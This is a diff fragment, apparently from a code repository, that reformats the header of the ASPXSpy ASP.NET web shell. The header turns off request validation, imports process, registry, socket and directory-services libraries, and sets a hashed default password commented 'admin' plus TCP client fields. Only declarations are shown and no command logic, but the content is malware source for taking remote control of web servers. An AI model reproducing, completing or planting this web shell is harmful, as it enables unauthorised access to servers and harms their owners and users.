@@ -1,31 +1,29 @@
-<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%>
-<%@ import Namespace="System.IO"%>
-<%@ import Namespace="System.Diagnostics"%>
-<%@ import Namespace="System.Data"%>
-<%@ import Namespace="System.Management"%>
-<%@ import Namespace="System.Data.OleDb"%>
-<%@ import Namespace="Microsoft.Win32"%>
-<%@ import Namespace="System.Net.Sockets" %>
-<%@ import Namespace="System.Net" %>
-<%@ import Namespace="System.Runtime.InteropServices"%>
-<%@ import Namespace="System.DirectoryServices"%>
-<%@ import Namespace="System.ServiceProcess"%>
-<%@ import Namespace="System.Text.RegularExpressions"%>
-<%@ Import Namespace="System.Threading"%>
-<%@ Import Namespace="System.Data.SqlClient"%>
-<%@ import Namespace="Microsoft.VisualBasic"%>
-<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
-<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
-<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
-<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<script runat="server">
-public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
-public string vbhLn="ASPXSpy";
-public int TdgGU=3-2;
-protected OleDbConnection Dtdr=new OleDbConnection();
-protected OleDbCommand Kkvb=new OleDbCommand();
-public NetworkStream NS=null;
+<%@ Page Language="C#" Debug="true" trace="false" validateRequest="false" EnableViewStateMac="false" EnableViewState="true"%><%@ import Namespace="System.IO"%>
+<%@ import Namespace="System.Diagnostics"%>
+<%@ import Namespace="System.Data"%>
+<%@ import Namespace="System.Management"%>
+<%@ import Namespace="System.Data.OleDb"%>
+<%@ import Namespace="Microsoft.Win32"%>
+<%@ import Namespace="System.Net.Sockets" %>
+<%@ import Namespace="System.Net" %>
+<%@ import Namespace="System.Runtime.InteropServices"%>
+<%@ import Namespace="System.DirectoryServices"%>
+<%@ import Namespace="System.ServiceProcess"%>
+<%@ import Namespace="System.Text.RegularExpressions"%>
+<%@ Import Namespace="System.Threading"%>
+<%@ Import Namespace="System.Data.SqlClient"%>
+<%@ import Namespace="Microsoft.VisualBasic"%>
+<%@ Assembly Name="System.DirectoryServices,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="System.Management,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="System.ServiceProcess,Version=2.0.0.0,Culture=neutral,PublicKeyToken=B03F5F7F11D50A3A"%>
+<%@ Assembly Name="Microsoft.VisualBasic,Version=7.0.3300.0,Culture=neutral,PublicKeyToken=b03f5f7f11d50a3a"%>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<script runat="server">
+public string Password="21232f297a57a5a743894a0e4a801fc3";//admin
+public string vbhLn="ASPXSpy";
+public int TdgGU=3-2;
+protected OleDbConnection Dtdr=new OleDbConnection();
+protected OleDbCommand Kkvb=new OleDbCommand();public NetworkStream NS=null;
 public NetworkStream NS1=null;
 TcpClient tcp=new TcpClient();
 TcpClient zvxm=new TcpClient();
